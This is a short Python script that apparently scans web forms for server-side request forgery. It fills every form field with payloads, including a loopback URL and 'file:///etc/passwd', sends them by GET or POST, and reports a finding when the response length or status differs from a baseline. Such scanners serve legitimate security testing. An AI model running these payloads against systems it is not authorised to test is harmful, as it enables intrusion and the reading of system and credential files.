import requests
from bs4 import BeautifulSoup
import mechanize
from form_urls import *
from form_input import *

payload=['http://127.0.0.1','https://udemy.com','127.0','file:///etc/passwd']
error=['']
list_of_urls=iterate_through_file('demofile.txt')


def make_req(data,payloa):
 d={}
 for i in data:
  d[i]=payloa
 return d

def normalGetResponse(url,data):
 d=make_req(data,'helloIamGoodThnkYou')
 request=requests.get(url,d)
 return len(request.text),request.status_code

def normalPostResponse(url,data):
 d=make_req(data,'helloIamGood')
 request=requests.post(url,d)
 return len(request.text),request.status_code

def ssrfInjection(req,d,length,status_code):
 flag=False
 if abs(len(req.text)-length)>20 or (status_code !=req.status_code):
  print("ssrf found on the url:"+req.url)
  print("payload:"+str(d))
  flag=True
 return flag

for i in list_of_urls:
 input_req=return_input(i)
 for k in range(0,len(input_req),3):
  if input_req[k+1]=='post' or input_req[k+1]=='POST':
   length,status_code=normalPostResponse(input_req[k],input_req[k+2])
   for pay in payload:
    d=make_req(input_req[k+2],pay)
    request=requests.post(input_req[k],d)
    if ssrfInjection(request,d,length,status_code):
     break
  elif input_req[k+1]=='get' or input_req[k+1]=='GET':
   length,status_code=normalGetResponse(input_req[k],input_req[k+2])
   for pay in payload:
    d=make_req(input_req[k+2],pay)
    request=requests.get(input_req[k],d)
    if ssrfInjection(request,d,length,status_code):
     break 
